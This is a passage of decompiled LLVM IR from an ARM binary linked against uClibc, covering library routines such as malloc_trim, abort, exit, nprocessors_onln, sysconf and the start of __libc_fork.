  store i32 64, i32* %r3.global-to-local, align 4
  %v0_11c74 = load i32, i32* @r7, align 4
  %v2_11c74 = add i32 %v0_11c74, 64
  %v3_11c74 = inttoptr i32 %v2_11c74 to i32*
  %v4_11c74 = load i32, i32* %v3_11c74, align 4
  store i32 %v4_11c74, i32* @r4, align 4
  %v1_11c78 = inttoptr i32 %v4_11c74 to i32*
  %v2_11c78 = load i32, i32* %v1_11c78, align 4
  store i32 %v2_11c78, i32* %r3.global-to-local, align 4
  %v1_11c7c = and i32 %v2_11c78, 2
  %v2_11c7c = icmp eq i32 %v1_11c7c, 0
  br i1 %v2_11c7c, label %bb16, label %bb

bb:                                               ; preds = %dec_label_pc_11c70
  store i32 %v4_11c74, i32* %r0.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_11c70, %bb
  %v1_11c84 = xor i1 %v2_11c7c, true
  call void @__pseudo_cond_branch(i1 %v1_11c84, i32 ptrtoint (i32* @global_var_11928.683 to i32))
  %v0_11c88 = load i32, i32* @r4, align 4
  %v1_11c88 = add i32 %v0_11c88, 44
  %v2_11c88 = inttoptr i32 %v1_11c88 to i32*
  %v3_11c88 = load i32, i32* %v2_11c88, align 4
  store i32 %v3_11c88, i32* %r3.global-to-local, align 4
  %v1_11c8c = add i32 %v3_11c88, 4
  %v2_11c8c = inttoptr i32 %v1_11c8c to i32*
  %v3_11c8c = load i32, i32* %v2_11c8c, align 4
  store i32 %v3_11c8c, i32* %r3.global-to-local, align 4
  %v1_11c90 = add i32 %v0_11c88, 836
  %v2_11c90 = inttoptr i32 %v1_11c90 to i32*
  %v3_11c90 = load i32, i32* %v2_11c90, align 4
  store i32 %v3_11c90, i32* %r2.global-to-local, align 4
  %v1_11c94 = and i32 %v3_11c8c, -4
  store i32 %v1_11c94, i32* %r3.global-to-local, align 4
  %v3_11c98 = icmp ult i32 %v1_11c94, %v3_11c90
  br i1 %v3_11c98, label %dec_label_pc_11cd8, label %dec_label_pc_11ca0

dec_label_pc_11ca0:                               ; preds = %bb16
  store i32 %v0_11c88, i32* %r1.global-to-local, align 4
  %v1_11ca4 = add i32 %v0_11c88, 840
  %v2_11ca4 = inttoptr i32 %v1_11ca4 to i32*
  %v3_11ca4 = load i32, i32* %v2_11ca4, align 4
  store i32 %v3_11ca4, i32* %r0.global-to-local, align 4
  %v2_11ca8 = call i32 @__malloc_trim(i32 %v3_11ca4, i32 %v0_11c88)
  store i32 %v2_11ca8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11cd8

dec_label_pc_11cb0:                               ; preds = %dec_label_pc_11b74
  %v2_11cb0 = inttoptr i32 %v1_11b44 to i32*
  %v3_11cb0 = load i32, i32* %v2_11cb0, align 4
  store i32 %v3_11cb0, i32* %r0.global-to-local, align 4
  %v1_11cb4 = add i32 %v4_11b34, 848
  %v2_11cb4 = inttoptr i32 %v1_11cb4 to i32*
  %v3_11cb4 = load i32, i32* %v2_11cb4, align 4
  store i32 %v3_11cb4, i32* %r2.global-to-local, align 4
  %v1_11cb8 = add i32 %v4_11b34, 868
  %v2_11cb8 = inttoptr i32 %v1_11cb8 to i32*
  %v3_11cb8 = load i32, i32* %v2_11cb8, align 4
  %v2_11cbc = add i32 %v3_11cb0, %v1_11b40
  store i32 %v2_11cbc, i32* %r1.global-to-local, align 4
  %v1_11cc0 = add i32 %v3_11cb4, -1
  store i32 %v1_11cc0, i32* %r2.global-to-local, align 4
  %v2_11cc4 = sub i32 %v3_11cb8, %v2_11cbc
  store i32 %v2_11cc4, i32* %r3.global-to-local, align 4
  store i32 %v2_11cc4, i32* %v2_11cb8, align 4
  %v1_11ccc = load i32, i32* @lr, align 4
  %v2_11ccc = add i32 %v1_11ccc, 848
  %v3_11ccc = inttoptr i32 %v2_11ccc to i32*
  store i32 %v1_11cc0, i32* %v3_11ccc, align 4
  %v0_11cd0 = load i32, i32* %r0.global-to-local, align 4
  %v1_11cd0 = load i32, i32* @r5, align 4
  %v2_11cd0 = sub i32 %v1_11cd0, %v0_11cd0
  store i32 %v2_11cd0, i32* %r0.global-to-local, align 4
  %v4_11cd4 = call i32 @munmap(i32 %v2_11cd0, i32 %v2_11cbc, i32 %v1_11cc0, i32 %v2_11cc4)
  store i32 %v4_11cd4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11cd8

dec_label_pc_11cd8:                               ; preds = %bb16, %dec_label_pc_11c68, %dec_label_pc_11ca0, %dec_label_pc_11b54, %dec_label_pc_11cb0
  store i32 %v2_11ae8, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v0_11ce4 = load i32, i32* @r7, align 4
  %v2_11ce4 = add i32 %v0_11ce4, 44
  %v3_11ce4 = inttoptr i32 %v2_11ce4 to i32*
  %v4_11ce4 = load i32, i32* %v3_11ce4, align 4
  store i32 %v4_11ce4, i32* %ip.global-to-local, align 4
  store i32 72944, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_11ce4)
  br label %dec_label_pc_11cf0

dec_label_pc_11cf0:                               ; preds = %entry, %dec_label_pc_11cd8
  store i32 %v3_11adc, i32* @r4, align 4
  store i32 %v6_11adc, i32* @r5, align 4
  store i32 %v9_11adc, i32* @r6, align 4
  store i32 %v12_11adc, i32* @r7, align 4
  store i32 %v18_11adc, i32* @lr, align 4
  ret i32 %v2_11ae8

; uselistorder directives
  uselistorder i32 %v0_11c88, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_11c48, { 1, 0 }
  uselistorder i32 %v1_11b88, { 1, 0 }
  uselistorder i32 %v0_11b88, { 1, 0 }
  uselistorder i32 %v3_11b5c, { 1, 0 }
  uselistorder i32 %v1_11b40, { 1, 0, 2 }
  uselistorder i32 %v2_11b3c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_11b34, { 1, 0, 2, 3 }
  uselistorder i32 %v0_11ae4, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 7, 5, 6, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 0, 5, 1, 6, 2, 7, 4, 3, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 108) to i32*), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_11cf0, { 1, 0 }
  uselistorder label %dec_label_pc_11cd8, { 4, 2, 0, 1, 3 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_11c68, { 1, 0 }
  uselistorder label %dec_label_pc_11c28, { 1, 0 }
  uselistorder label %dec_label_pc_11c1c, { 1, 0 }
  uselistorder label %dec_label_pc_11c18, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_11bcc, { 1, 0 }
}

define i32 @function_11d00(i32 %arg1) local_unnamed_addr {
dec_label_pc_11d00:
  %v0_11d00 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11d00, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_11d00
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_11d00, %bb
  %v4_11d14 = phi i32 [ %arg1, %dec_label_pc_11d00 ], [ 0, %bb ]
  ret i32 %v4_11d14

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_11d18 = load i32, i32* @r4, align 4
  store i32 %v3_11d18, i32* %stack_var_-12, align 4
  %v6_11d18 = load i32, i32* @r5, align 4
  %v4_11d28 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 64) to i32*), align 4
  store i32 %v4_11d28, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_11d28, i32* @r0, align 4
  %v0_11d38 = call i32 @__malloc_consolidate()
  %v0_11d3c = load i32, i32* @r4, align 4
  %v0_11d40 = load i32, i32* @r5, align 4
  %v2_11d48 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_11d48, i32* @r4, align 4
  store i32 %v6_11d18, i32* @r5, align 4
  %v2_11d4c = call i32 @__malloc_trim(i32 %v0_11d3c, i32 %v0_11d40)
  %v0_11d50 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11d50, label %bb, label %.thread

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v4_11d54 = phi i32 [ %v2_11d4c, %entry ], [ 0, %bb ]
  ret i32 %v4_11d54

; uselistorder directives
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 64) to i32*), { 17, 3, 2, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* @r5, align 4
  %v4_11d70 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 16) to i32*), align 4
  store i32 73084, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_11d70)
  store i32 32, i32* %stack_var_-8, align 4
  %v4_11d98 = call i32 @__GI_sigprocmask(i32 1, i32* nonnull %stack_var_-8, i32 0)
  %v0_11da0 = load i32, i32* @r5, align 4
  %v2_11da0 = add i32 %v0_11da0, 628
  %v3_11da0 = inttoptr i32 %v2_11da0 to i32*
  %v4_11da0 = load i32, i32* %v3_11da0, align 4
  %v2_11da4 = icmp eq i32 %v4_11da0, 0
  br i1 %v2_11da4, label %dec_label_pc_11dac, label %dec_label_pc_11dec

dec_label_pc_11dac:                               ; preds = %entry
  store i32 1, i32* %v3_11da0, align 4
  br label %dec_label_pc_11db4

dec_label_pc_11db4:                               ; preds = %dec_label_pc_11dfc, %dec_label_pc_11dac
  %v0_11db8 = load i32, i32* @r5, align 4
  %v2_11db8 = add i32 %v0_11db8, 212
  store i32 %v2_11db8, i32* @r4, align 4
  %v2_11dc4 = add i32 %v0_11db8, 68
  %v3_11dc4 = inttoptr i32 %v2_11dc4 to i32*
  %v4_11dc4 = load i32, i32* %v3_11dc4, align 4
  call void @__pseudo_branch(i32 %v4_11dc4)
  %v1_11dd4 = call i32 @__GI_raise(i32 6)
  %v0_11de0 = load i32, i32* @r5, align 4
  %v2_11de0 = add i32 %v0_11de0, 16
  %v3_11de0 = inttoptr i32 %v2_11de0 to i32*
  %v4_11de0 = load i32, i32* %v3_11de0, align 4
  store i32 73196, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_11de0)
  %v0_11df0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11dec

dec_label_pc_11dec:                               ; preds = %entry, %dec_label_pc_11db4
  %v1_11e04 = phi i32 [ %v0_11da0, %entry ], [ %v0_11df0.pre, %dec_label_pc_11db4 ]
  %v2_11df0 = add i32 %v1_11e04, 628
  %v3_11df0 = inttoptr i32 %v2_11df0 to i32*
  %v4_11df0 = load i32, i32* %v3_11df0, align 4
  %v7_11df4 = icmp eq i32 %v4_11df0, 1
  br i1 %v7_11df4, label %dec_label_pc_11dfc, label %dec_label_pc_11e38

dec_label_pc_11dfc:                               ; preds = %dec_label_pc_11dec
  %v2_11dfc = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_11dfc, i32* @r4, align 4
  store i32 2, i32* %v3_11df0, align 4
  %v3_11e14 = bitcast i32* %stack_var_-28 to i8*
  %v4_11e14 = call i32 @__GI_memset(i8* %v3_11e14, i32 0, i32 20)
  %v3_11e30 = call i32 @__libc_sigaction(i32 6, i32 %v2_11dfc, i32 0)
  br label %dec_label_pc_11db4

dec_label_pc_11e38:                               ; preds = %dec_label_pc_11dec
  %v7_11e38 = icmp eq i32 %v4_11df0, 2
  br i1 %v7_11e38, label %dec_label_pc_11e40, label %dec_label_pc_11e4c

dec_label_pc_11e40:                               ; preds = %dec_label_pc_11e38
  store i32 3, i32* %v3_11df0, align 4
  %v0_11e48 = call i32 @abort()
  %v0_11e4c.pre = load i32, i32* @r5, align 4
  %v1_11e4c.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_11e4c

dec_label_pc_11e4c:                               ; preds = %dec_label_pc_11e38, %dec_label_pc_11e40
  %v3_11e58 = phi i32 [ 628, %dec_label_pc_11e38 ], [ %v1_11e4c.pre, %dec_label_pc_11e40 ]
  %v2_11e58 = phi i32 [ %v1_11e04, %dec_label_pc_11e38 ], [ %v0_11e4c.pre, %dec_label_pc_11e40 ]
  %v2_11e4c = add i32 %v2_11e58, %v3_11e58
  %v3_11e4c = inttoptr i32 %v2_11e4c to i32*
  %v4_11e4c = load i32, i32* %v3_11e4c, align 4
  %v7_11e50 = icmp eq i32 %v4_11e4c, 3
  br i1 %v7_11e50, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_11e4c
  store i32 4, i32* %v3_11e4c, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_11e4c, %bb
  call void @__pseudo_cond_branch(i1 %v7_11e50, i32 ptrtoint (i32* @global_var_13820.692 to i32))
  br label %dec_label_pc_11e64

dec_label_pc_11e64:                               ; preds = %dec_label_pc_11e64, %.thread2
  %v0_11e64 = call i32 @abort()
  br label %dec_label_pc_11e64

; uselistorder directives
  uselistorder i32* %v3_11df0, { 1, 0, 2 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 16) to i32*), { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_11e4c, { 1, 0 }
  uselistorder label %dec_label_pc_11dec, { 1, 0 }
}

define i32 @function_11e70(i64* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11e70:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_11e70 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11e70, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_11e70
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_11e70, %bb
  %v4_11e7c = phi i32 [ %tmp, %dec_label_pc_11e70 ], [ 0, %bb ]
  ret i32 %v4_11e7c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* @r5, align 4
  %v4_11e8c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 140) to i32*), align 4
  store i32 %v4_11e8c, i32* @r4, align 4
  %v2_11e94 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_11eac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 112) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_11eac)
  %v0_11ec0 = load i32, i32* @r5, align 4
  %v2_11ec0 = add i32 %v0_11ec0, 16
  %v3_11ec0 = inttoptr i32 %v2_11ec0 to i32*
  %v4_11ec0 = load i32, i32* %v3_11ec0, align 4
  call void @__pseudo_branch(i32 %v4_11ec0)
  %v0_11ed0 = load i32, i32* @r5, align 4
  %v2_11ed0 = add i32 %v0_11ed0, 632
  %v3_11ed0 = inttoptr i32 %v2_11ed0 to i32*
  %v4_11ed0 = load i32, i32* %v3_11ed0, align 4
  %v2_11ed8 = icmp eq i32 %v4_11ed0, 0
  br i1 %v2_11ed8, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_11ee4 = xor i1 %v2_11ed8, true
  call void @__pseudo_cond_branch(i1 %v2_11ee4, i32 %v4_11ed0)
  store i32 %v2_11e94, i32* @r0, align 4
  %v0_11ef4 = load i32, i32* @r5, align 4
  %v2_11ef4 = add i32 %v0_11ef4, 44
  %v3_11ef4 = inttoptr i32 %v2_11ef4 to i32*
  %v4_11ef4 = load i32, i32* %v3_11ef4, align 4
  call void @__pseudo_branch(i32 %v4_11ef4)
  %v0_11f00 = call i32 @__GI___uClibc_fini()
  %v0_11f08 = load i32, i32* @r5, align 4
  %v2_11f08 = add i32 %v0_11f08, -49592
  %v2_11f10 = icmp eq i32 %v2_11f08, 0
  br i1 %v2_11f10, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_11f18 = xor i1 %v2_11f10, true
  call void @__pseudo_cond_branch(i1 %v2_11f18, i32 %v2_11f08)
  %v0_11f1c = load i32, i32* @r6, align 4
  %v1_11f20 = call i32 @__GI__exit(i32 %v0_11f1c)
  %v0_11f24 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11f24, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v2_11f24 = load i32, i32* @r4, align 4
  %v5_11f24 = mul i32 %v2_11f24, 536870912
  %v6_11f24 = and i32 %v5_11f24, %v1_11f20
  store i32 %v6_11f24, i32* @lr, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v4_11f3c = phi i32 [ %v1_11f20, %bb9 ], [ 0, %bb10 ]
  ret i32 %v4_11f3c

; uselistorder directives
  uselistorder i32 %v1_11f20, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 -34036), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_11f64 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 -34036))
  store i32 %v1_11f64, i32* @r6, align 4
  %v2_11f68 = icmp eq i32 %v1_11f64, 0
  br i1 %v2_11f68, label %dec_label_pc_11fe8, label %dec_label_pc_11f70

dec_label_pc_11f70:                               ; preds = %entry
  store i32 276, i32* @sl, align 4
  %v0_11f78 = load i32, i32* @r4, align 4
  %v2_11f78 = add i32 %v0_11f78, -34024
  store i32 %v2_11f78, i32* @r8, align 4
  %v2_11f7c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_11f7c, i32* @r7, align 4
  br label %bb18

dec_label_pc_11f84:                               ; preds = %bb18
  %v3_11f84 = load i32, i32* %stack_var_-36, align 4
  %v1_11f88 = inttoptr i32 %v3_11f84 to i32*
  %v2_11f88 = load i32, i32* %v1_11f88, align 4
  %v1_11f8c = inttoptr i32 %v2_11f88 to i8*
  %v2_11f8c = load i8, i8* %v1_11f8c, align 1
  %v7_11f90 = icmp eq i8 %v2_11f8c, 99
  br i1 %v7_11f90, label %dec_label_pc_11f98, label %.backedge3

dec_label_pc_11f98:                               ; preds = %dec_label_pc_11f84
  %v1_11f98 = add i32 %v2_11f88, 1
  %v2_11f98 = inttoptr i32 %v1_11f98 to i8*
  %v3_11f98 = load i8, i8* %v2_11f98, align 1
  %v7_11f9c = icmp eq i8 %v3_11f98, 112
  br i1 %v7_11f9c, label %dec_label_pc_11fa4, label %.backedge3

dec_label_pc_11fa4:                               ; preds = %dec_label_pc_11f98
  %v1_11fa4 = add i32 %v2_11f88, 2
  %v2_11fa4 = inttoptr i32 %v1_11fa4 to i8*
  %v3_11fa4 = load i8, i8* %v2_11fa4, align 1
  %v7_11fa8 = icmp eq i8 %v3_11fa4, 117
  br i1 %v7_11fa8, label %dec_label_pc_11fb0, label %.backedge3

dec_label_pc_11fb0:                               ; preds = %dec_label_pc_11fa4
  %v1_11fb0 = add i32 %v2_11f88, 3
  %v2_11fb0 = inttoptr i32 %v1_11fb0 to i8*
  %v3_11fb0 = load i8, i8* %v2_11fb0, align 1
  %v4_11fb0 = zext i8 %v3_11fb0 to i32
  %v0_11fb4 = load i32, i32* @r4, align 4
  %v1_11fb4 = load i32, i32* @sl, align 4
  %v2_11fb4 = add i32 %v1_11fb4, %v0_11fb4
  %v3_11fb4 = inttoptr i32 %v2_11fb4 to i32*
  %v4_11fb4 = load i32, i32* %v3_11fb4, align 4
  %v2_11fb8 = mul nuw nsw i32 %v4_11fb0, 2
  %v2_11fbc = add i32 %v4_11fb4, %v2_11fb8
  %v3_11fbc = inttoptr i32 %v2_11fbc to i16*
  %v4_11fbc = load i16, i16* %v3_11fbc, align 2
  %v1_11fc0 = and i16 %v4_11fbc, 8
  %v2_11fc0 = icmp eq i16 %v1_11fc0, 0
  br i1 %v2_11fc0, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_11fb0
  %v1_11fc4 = load i32, i32* @r5, align 4
  %v2_11fc4 = add i32 %v1_11fc4, 1
  store i32 %v2_11fc4, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_11fb0, %dec_label_pc_11f84, %dec_label_pc_11f98, %dec_label_pc_11fa4
  %v0_11fc8.pre = load i32, i32* @r6, align 4
  %v0_11fd4.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_11f70
  %v0_11fd4 = phi i32 [ %v0_11fd4.pre, %.backedge3 ], [ %v2_11f78, %dec_label_pc_11f70 ]
  %v0_11fc8 = phi i32 [ %v0_11fc8.pre, %.backedge3 ], [ %v1_11f64, %dec_label_pc_11f70 ]
  %v4_11fd8 = inttoptr i32 %v0_11fc8 to i32*
  %v5_11fd8 = call i32 @__GI_config_read(i32* %v4_11fd8, i32 %v2_11f7c, i32 258, i32 %v0_11fd4)
  %v2_11fdc = icmp eq i32 %v5_11fd8, 0
  br i1 %v2_11fdc, label %dec_label_pc_1204c, label %dec_label_pc_11f84

dec_label_pc_11fe8:                               ; preds = %entry
  %v0_11fec = load i32, i32* @r4, align 4
  %v2_11fec = add i32 %v0_11fec, -34020
  store i32 %v2_11fec, i32* @r0, align 4
  %v1_11ff0 = call i32 @__GI_config_open(i32 %v2_11fec)
  store i32 %v1_11ff0, i32* @r6, align 4
  %v2_11ff4 = icmp eq i32 %v1_11ff0, 0
  br i1 %v2_11ff4, label %bb19, label %dec_label_pc_12000

bb19:                                             ; preds = %dec_label_pc_11fe8
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_1204c

dec_label_pc_12000:                               ; preds = %dec_label_pc_11fe8
  %v0_12004 = load i32, i32* @r4, align 4
  %v2_12004 = add i32 %v0_12004, -34004
  store i32 %v2_12004, i32* @r8, align 4
  %v2_1200c = add i32 %v0_12004, -33968
  store i32 %v2_1200c, i32* @r7, align 4
  %v2_12010 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_12010, i32* @r4, align 4
  br label %bb21

dec_label_pc_12018:                               ; preds = %bb21
  %v0_12044 = load i32, i32* @r8, align 4
  %v3_12018 = load i32, i32* %stack_var_-36, align 4
  %v1_1201c = inttoptr i32 %v3_12018 to i32*
  %v2_1201c = load i32, i32* %v1_1201c, align 4
  store i32 %v2_1201c, i32* @r1, align 4
  %v2_12020 = inttoptr i32 %v0_12044 to i8*
  %v3_12020 = call i32 @__GI_strcoll(i8* %v2_12020, i32 %v2_1201c)
  %v2_12024 = icmp eq i32 %v3_12020, 0
  br i1 %v2_12024, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_12018
  %v1_12028 = load i32, i32* @r5, align 4
  %v2_12028 = add i32 %v1_12028, 1
  store i32 %v2_12028, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_12018
  %v0_12034.pre = load i32, i32* @r7, align 4
  %v0_12038.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_12000
  %v0_12038 = phi i32 [ %v0_12038.pre, %.backedge ], [ %v1_11ff0, %dec_label_pc_12000 ]
  %v0_12034 = phi i32 [ %v0_12034.pre, %.backedge ], [ %v2_1200c, %dec_label_pc_12000 ]
  %v4_1203c = inttoptr i32 %v0_12038 to i32*
  %v5_1203c = call i32 @__GI_config_read(i32* %v4_1203c, i32 %v2_12010, i32 459266, i32 %v0_12034)
  %v2_12040 = icmp eq i32 %v5_1203c, 0
  br i1 %v2_12040, label %dec_label_pc_1204c, label %dec_label_pc_12018

dec_label_pc_1204c:                               ; preds = %bb18, %bb21, %bb19
  %v0_1204c = load i32, i32* @r6, align 4
  %v1_12050 = inttoptr i32 %v0_1204c to i32*
  %v2_12050 = call i32 @__GI_config_close(i32* %v1_12050)
  %v0_12054 = load i32, i32* @r5, align 4
  %v2_12054 = icmp eq i32 %v0_12054, 0
  %.v0_12054 = select i1 %v2_12054, i32 1, i32 %v0_12054
  ret i32 %.v0_12054

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder i32 (i32)* @__GI_config_open, { 1, 0 }
  uselistorder label %dec_label_pc_1204c, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_12480

bb:                                               ; preds = %entry
  %v7_120a4 = mul i32 %arg1, 4
  %v8_120a4 = add i32 %v7_120a4, ptrtoint (i32* @global_var_120ac.711 to i32)
  call void @__pseudo_branch(i32 %v8_120a4)
  br label %dec_label_pc_12480

dec_label_pc_12480:                               ; preds = %bb, %entry
  %v0_12484 = call i32 @__aeabi_read_tp()
  %v3_12488 = load i16, i16* @global_var_20d6c.590, align 2
  %v4_12488 = sext i16 %v3_12488 to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_12494 = add i32 %v4_12488, %v0_12484
  %v4_12494 = inttoptr i32 %v3_12494 to i32*
  store i32 22, i32* %v4_12494, align 4
  %v0_12678 = load i32, i32* %r1.global-to-local, align 4
  ret i32 %v0_12678

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  store i32 12824, i32* %r5.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32* %r8.global-to-local, align 4
  %v4_127a416 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20d14.594 to i32), i32 12824) to i32*), align 4
  store i32 %v4_127a416, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_127a818 = icmp eq i32 %v4_127a416, 0
  br i1 %v2_127a818, label %dec_label_pc_127b0, label %dec_label_pc_126d4

dec_label_pc_126d4:                               ; preds = %entry, %dec_label_pc_127a4.backedge
  call void @__pseudo_branch(i32 -61536)
  %v0_126e0 = load i32, i32* %r7.global-to-local, align 4
  %v1_126e0 = add i32 %v0_126e0, 20
  %v2_126e0 = inttoptr i32 %v1_126e0 to i32*
  %v3_126e0 = load i32, i32* %v2_126e0, align 4
  store i32 %v3_126e0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_126e4 = icmp eq i32 %v3_126e0, 0
  store i32 %v3_126e0, i32* %r4.global-to-local, align 4
  br i1 %v2_126e4, label %dec_label_pc_127a4.backedge, label %dec_label_pc_126f4

dec_label_pc_127a4.backedge:                      ; preds = %dec_label_pc_126d4, %dec_label_pc_12720
  %v0_127a4 = load i32, i32* %r8.global-to-local, align 4
  %v1_127a4 = load i32, i32* %r5.global-to-local, align 4
  %v2_127a4 = add i32 %v1_127a4, %v0_127a4
  %v3_127a4 = inttoptr i32 %v2_127a4 to i32*
  %v4_127a4 = load i32, i32* %v3_127a4, align 4
  store i32 %v4_127a4, i32* %r7.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_127a8 = icmp eq i32 %v4_127a4, 0
  br i1 %v2_127a8, label %dec_label_pc_127b0, label %dec_label_pc_126d4

dec_label_pc_126f4:                               ; preds = %dec_label_pc_126d4
  %v0_126f4 = load i32, i32* %r8.global-to-local, align 4
  %v1_126f4 = load i32, i32* %r5.global-to-local, align 4
  %v2_126f4 = add i32 %v1_126f4, %v0_126f4
  %v3_126f4 = inttoptr i32 %v2_126f4 to i32*
  %v4_126f4 = load i32, i32* %v3_126f4, align 4
  %v1_126f8 = add i32 %v4_126f4, 20
